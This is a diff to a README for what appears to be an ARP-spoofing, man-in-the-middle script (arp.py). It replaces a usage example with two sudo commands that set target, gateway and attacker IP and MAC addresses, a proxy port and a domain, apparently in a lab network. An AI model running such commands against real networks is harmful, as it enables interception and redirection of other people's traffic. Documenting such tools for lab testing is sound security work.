@@ -38,7 +38,10 @@ python script_name.py -i <interface> --target-ip <target_ip> [options]
 
 ### Example
 ```bash
-python script_name.py -i eth0 --target-ip 192.168.1.100 --proxy-port 8080 --domain example.com
+# Auto
+sudo python3 arp.py -i eth0 --target-ip 192.168.1.100 --proxy-port 8080 --domain example.com
+# Manual (most trustable method)
+sudo python3 arp.py --target-ip 192.168.100.183 --target-mac 52:54:00:9f:47:11 --gateway-ip 192.168.100.153 --gateway-mac 52:54:00:b0:a1:55 --attacker-ip 192.168.100.131 --domain wintastic.local -i eth0
 ```
 
 ## Functions
